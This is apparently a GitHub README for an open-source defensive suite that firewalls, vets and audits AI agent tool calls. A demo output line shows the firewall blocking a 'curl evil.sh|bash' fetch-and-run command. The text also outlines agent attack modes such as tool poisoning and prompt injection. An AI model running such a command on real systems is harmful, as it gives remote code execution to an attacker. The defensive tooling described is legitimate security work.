# agent-security-stack

[![OpenSSF Scorecard](https://img.shields.io/ossf-scorecard/github.com/askalf/agent-security-stack?label=OpenSSF%20Scorecard)](https://scorecard.dev/viewer/?uri=github.com/askalf/agent-security-stack)

> _**Own your agent security.**_ The open-source agent-security suite — **[redstamp](https://github.com/askalf/redstamp) · [truecopy](https://github.com/askalf/truecopy) · [strongroom](https://github.com/askalf/strongroom)** — three tools that compose into one layered defense for every agent tool call, exposed as one MCP server. Part of **[Own Your Stack](https://github.com/askalf)**.

OpenClaw became 2026's first big AI-security disaster three ways at once: one-click **RCE**, a **poisoned skills** marketplace, and ~135k **leaked credentials**. Three failure modes — three small, open-source, zero-dependency tools, composed into one layered defense:

| | own your… | closes | role |
|---|---|---|---|
| **[redstamp](https://github.com/askalf/redstamp)** | agent **actions** | RCE · exfil · SSRF · prompt-injection | the **runtime firewall** — what a tool may *do* |
| **[truecopy](https://github.com/askalf/truecopy)** | agent **skills** | poisoned / drifted skills & MCP servers | the **supply-chain gate** — which tools may *exist* |
| **[strongroom](https://github.com/askalf/strongroom)** | agent **secrets** | leaked API keys / credentials | the **vault** — a lease, never the key |

The three answer OpenClaw's three failures and **compose in-path** into a single guarded tool call (below).

They aren't three islands — they share one spine: truecopy reuses redstamp's scanner, and strongroom reuses redstamp's tamper-evident audit. `npm install` dedupes redstamp to a single shared copy. All three are **pinned to vetted commits**, so the stack is itself a reproducible supply chain — the thing it's protecting.

## The tool-call path — three layers, one guarded call

```js
function guardedCall({ tool, action, lease }) {
  if (!truecopyVetted(tool))  return blocked('truecopy');   // supply chain  — is the tool pinned, unmodified, unpoisoned?
  if (redstamp.blocks(action))  return blocked('redstamp');  // runtime       — is the action safe?
  if (!strongroom.redeems(lease)) return blocked('strongroom');  // secrets       — is there a valid, scoped lease?
  return proceed();
}
```

A tool call proceeds **only when all three agree**. Flip any one layer to "bad" and the call stops there — `truecopy` before `redstamp` before `strongroom`.

## Drop in at runtime — no app changes

The `guardedCall` above is the composition in one function; each layer also ships a **drop-in enforcer** so the same defense holds at the process / network boundary with no code changes:

- **`truecopy-mcp`** — an MCP proxy in front of a server: only pinned, unmodified, unpoisoned tools survive `tools/list`, and a call to anything it dropped is blocked. *Which tools may exist.*
- **`redstamp-mcp`** — an MCP proxy that firewalls every `tools/call` (RCE, exfil, SSRF, prompt-injection, and OS-persistence: cron / systemd-user / scheduled-task / WMI / registry-autorun) and strips poisoned tools before the client sees them; optional daemon, native fast hook, and a gray-zone LLM judge that can only *raise* risk. *What a call may do.*
- **`strongroom broker`** — point your API client's base URL at it with no key; for each call it redeems a scoped, single-use lease and injects the real secret at egress, bound to one upstream. *A key the agent never holds.*

Chain them — `client → truecopy-mcp → redstamp-mcp → server`, egress through `strongroom broker` — and a tool must be **vetted to exist, safe to run, and hold a valid lease to touch a secret**. Same three-way agreement as `guardedCall`, enforced live.

## One MCP server — call the whole stack

The proxies above enforce *mandatorily, in the path*. `oys-mcp` is the complementary **on-demand** surface: one MCP server that hands any client — Claude Desktop, Claude Code, any agent runtime — the trio as callable tools, so an agent can ask the stack to vet content, actions, and secrets mid-task.

| tool | layer | does |
|------|-------|------|
| `warden_check` | contain | is this `{tool, input}` safe to run? → allow / approve / block + why |
| `canon_scan` | vet | scan an MCP/skill manifest (JSON) for poisoning → clean / flagged |
| `keeper_lease` | key | lease a vault secret → an **opaque handle**; the secret never returns |

```json
{
  "mcpServers": {
    "own-your-stack": {
      "command": "npx",
      "args": ["-y", "github:askalf/agent-security-stack", "oys-mcp"],
      "env": {
        "KEEPER_HOME": "/path/to/strongroom/vault",
        "OYS_WARDEN_POLICY": "{\"egressAllow\":[\"api.example.com\"]}"
      }
    }
  }
}
```

> Not yet on npm — installs straight from GitHub.

Each tool wraps the real library (`@askalf/redstamp`, `@askalf/truecopy`, `@askalf/strongroom`) — no reimplementation. `keeper_lease` returns only the lease handle; the secret is materialized at egress, never through the tool. (`redstamp-mcp` / `truecopy-mcp` remain the deployment-grade *mandatory* mode.)

## Run it

```bash
npm install     # pulls redstamp + truecopy + strongroom
npm run demo    # the layered defense: a clean call proceeds; a poisoned tool, a curl|bash, and a spent lease each get stopped
npm run demo:mcp  # drive all three tools over the MCP protocol
npm run demo:audit # beat #4: the gate's decisions, hash-chained — tamper one entry, verification breaks
npm test        # the same compositions, as assertions
```

```text
1. vetted tool, safe GET, valid lease          {"ok":true}            the call proceeds
2. a POISONED tool                             {"ok":false,"by":"truecopy"}    <- truecopy stops it
3. a vetted tool that tries curl evil.sh|bash  {"ok":false,"by":"redstamp"}   <- redstamp stops it
4. a vetted tool whose lease is spent          {"ok":false,"by":"strongroom"}   <- strongroom stops it
```

*vet it (truecopy) → contain it (redstamp) → key it never holds (strongroom).*

## The fourth guarantee — a tamper-evident trail

Stopping a bad call is half of trust; the other half is **proving, afterward, what every layer decided** — without that, a compromised host could quietly rewrite the log to hide that it ever stopped (or *let through*) anything. The gate records each layer's verdict into a single **hash-chained** audit (redstamp's shipped [`./audit`](https://github.com/askalf/redstamp/blob/master/src/audit.mjs) primitive — the same one strongroom reuses for secret access): each entry seals the one before it, rooted at a fixed genesis. Edit, delete, or splice any past verdict and `verify()` breaks and **points at the entry**.

```text
The trail on disk — 10 chained entries, each sealing the one before:
  #0  truecopy/pass              hash a99d936f…  ⟵ prev 00000000…
  #1  redstamp/allow (green)    hash 787fa068…  ⟵ prev a99d936f…
  #2  strongroom/redeem           hash 6b4380bd…  ⟵ prev 787fa068…
  #3  gate/proceed            hash b0b1aea2…  ⟵ prev 6b4380bd…
  #4  truecopy/block             hash 252d591e…  ⟵ prev b0b1aea2…   ← the poisoned tool, refused
  …
  verifyAuditFile() → {"ok":true,"entries":10}        ✅ INTACT

Attacker rewrites entry #4 (truecopy's block) to read 'pass'…
  verifyAuditFile() → {"ok":false,"at":4}             ❌ BROKEN — tamper detected at entry #4
```

`npm run demo:audit` runs this live; `npm test` asserts it (intact chain verifies; an edit, and a mid-log deletion, both break it and pinpoint where). strongroom additionally seals its own secret-access log with an HMAC **tip**, so even truncating or re-rooting that log is detectable.

## Related Own Your Stack tools

This stack guards the **tool-call** path. Two more **[Own Your Stack](https://github.com/askalf)** tools — separate from this suite — apply the same principle (*govern the agent, don't trust the surface*) to the other surfaces an agent touches:

- **[cordon](https://github.com/askalf/cordon)** — *own your prompts.* A drop-in LLM compliance gateway that strips PII / PHI / PCI / secrets out of a prompt before it reaches the model — fail-closed, deterministic, with a hash-chained audit.
- **[fieldpass](https://github.com/askalf/fieldpass)** — *own your agent browser.* An indirect-prompt-injection firewall + action gate around a CDP / Chrome browser, so an agent can read a hostile web page without being hijacked by it.

---
Part of **[Own Your Stack](https://github.com/askalf)** — own your AI infrastructure instead of renting it. Built by Thomas Sprayberry.
